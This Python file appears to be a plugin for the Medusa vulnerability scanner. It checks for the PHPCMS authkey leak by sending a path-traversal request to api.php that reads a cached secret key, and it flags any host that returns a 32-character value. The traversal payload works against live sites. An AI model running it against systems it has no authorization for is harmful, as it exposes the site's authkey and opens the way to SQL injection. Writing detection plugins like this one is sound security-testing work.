#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms authkey泄露
referer: http://wooyun.org/bugs/wooyun-2015-0105242
author: Ascotbe
reference: Lucifer
description: PHPCMS authkey 泄露漏洞，可引起SQL注入。
'''
import urllib
import requests
import re
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and re.search('(\w{32})',con):
            Medusa = "{} 存在PHPCMS authkey泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass